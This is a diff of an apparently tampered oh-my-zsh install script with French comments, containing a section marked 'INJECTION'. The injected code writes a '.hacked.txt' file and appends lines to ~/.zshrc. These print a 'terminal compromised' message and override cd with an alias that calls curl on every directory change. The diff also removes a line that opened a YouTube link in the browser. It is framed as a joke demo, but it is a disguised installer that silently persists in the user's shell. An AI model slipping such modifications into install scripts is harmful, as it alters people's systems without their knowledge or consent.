@@ -554,17 +554,14 @@ EOF
   echo "[⚠️] Configuration additionnelle... 🤖"
 
   # Créer un fichier 'hacked.txt' pour montrer la prise de contrôle
-  echo "You just got hacked (in a demo 😄) by a modified oh-my-zsh install." > ~/.hacked.txt
+  echo "Oopsy tu viens de te faire avoir par mon oh-my-zsh install personnalisé." > ~/.hacked.txt
 
   # Ajouter un message dans le terminal à chaque lancement
   if [ -f ~/.zshrc ]; then
-    echo 'echo "💀 Terminal compromis par un script modifié ! 💀"' >> ~/.zshrc
-      echo 'alias cd="echo \\"\\n🌦️ Météo du jour :\\"; curl -s wttr.in/Grenoble?format=3; echo \\"\\n\\"; command cd \"$@\""' >> ~/.zshrc
+    echo 'echo "💀 Aïe ton terminal est désormais compromis par un script modifié ! 💀"' >> ~/.zshrc
+      echo 'alias cd="echo \\"\\nTu es sûr que tu ne veux pas rester ici plutôt ? Regarde comme on est bien :\\"; echo \\"Météo à Grenoble :\\"; curl -s wttr.in/Grenoble?format=3; echo \\"\\n\\"; command cd \"$@\""' >> ~/.zshrc
 
   fi
-
-  # Ouvrir un onglet navigateur
-  ( xdg-open "https://www.youtube.com/watch?v=dQw4w9WgXcQ" > /dev/null 2>&1 & )
 
   # --- FIN INJECTION ---
 
